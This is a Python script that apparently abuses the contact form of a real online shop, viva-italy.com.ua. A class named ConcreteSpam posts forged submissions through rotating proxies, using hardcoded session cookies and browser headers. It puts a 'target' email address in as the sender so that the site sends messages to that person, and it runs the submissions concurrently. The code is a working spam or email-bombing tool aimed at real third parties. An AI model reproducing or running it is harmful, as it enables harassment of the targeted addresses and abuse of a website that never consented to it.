from os.path import basename

import requests

from module import Spam

cookies = {
    'PrestaShop-29dfcaf1011e984309b59a37fd827398': 'lBwzdkR4L%2Bifp%2BTrh4E%2BejPj39z1H8HWqkmVgNQKHTsoVFNyVdIlrAeToIECNv6rkv54ZIMQGbDPXQBgA8lbBjdZu%2FdZKaLMWRazRmvtmVAZ1CsPeicdp%2FiiCbbBtjslSkyyOTrMA%2BcKCFEB7s35AFntdlxZrplXwL2E%2FICbqwRhUBSvFgZjsYwUD0f9vBXe000139',
    '_ga': 'GA1.3.1230280580.1675959453',
    '_gid': 'GA1.3.2004305360.1675959453',
    '_gat': '1',
    '_ym_uid': '1675959453933997430',
    '_ym_d': '1675959453',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
    'PHPSESSID': 'kngqlq3mts19l2qsm210id9626',
}

headers = {
    'authority': 'www.viva-italy.com.ua',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOulA8ybmeSpjCTzW',
    # 'cookie': 'PrestaShop-29dfcaf1011e984309b59a37fd827398=lBwzdkR4L%2Bifp%2BTrh4E%2BejPj39z1H8HWqkmVgNQKHTsoVFNyVdIlrAeToIECNv6rkv54ZIMQGbDPXQBgA8lbBjdZu%2FdZKaLMWRazRmvtmVAZ1CsPeicdp%2FiiCbbBtjslSkyyOTrMA%2BcKCFEB7s35AFntdlxZrplXwL2E%2FICbqwRhUBSvFgZjsYwUD0f9vBXe000139; _ga=GA1.3.1230280580.1675959453; _gid=GA1.3.2004305360.1675959453; _gat=1; _ym_uid=1675959453933997430; _ym_d=1675959453; _ym_isad=2; _ym_visorc=w; PHPSESSID=kngqlq3mts19l2qsm210id9626',
    'origin': 'https://www.viva-italy.com.ua',
    'referer': 'https://www.viva-italy.com.ua/contact-us',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryOulA8ybmeSpjCTzW\r\nContent-Disposition: form-data; name="id_contact"\r\n\r\n2\r\n------WebKitFormBoundaryOulA8ybmeSpjCTzW\r\nContent-Disposition: form-data; name="from"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryOulA8ybmeSpjCTzW\r\nContent-Disposition: form-data; name="id_order"\r\n\r\ntest https://www.viva-italy.com.ua/contact-us\r\n------WebKitFormBoundaryOulA8ybmeSpjCTzW\r\nContent-Disposition: form-data; name="sobhenie"\r\n\r\ntest https://www.viva-italy.com.ua/contact-us\r\n------WebKitFormBoundaryOulA8ybmeSpjCTzW\r\nContent-Disposition: form-data; name="tyEVK4JUEwpkW3N28tsC9vvngf7254Z"\r\n\r\n\r\n------WebKitFormBoundaryOulA8ybmeSpjCTzW\r\nContent-Disposition: form-data; name="submitMessage"\r\n\r\n\r\n------WebKitFormBoundaryOulA8ybmeSpjCTzW--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post('https://www.viva-italy.com.ua/contact-us', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    s = 'Ваше сообщение отправлено в службу поддержки.'

    spam = ConcreteSpam(basename(__file__)[:-3], s, target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
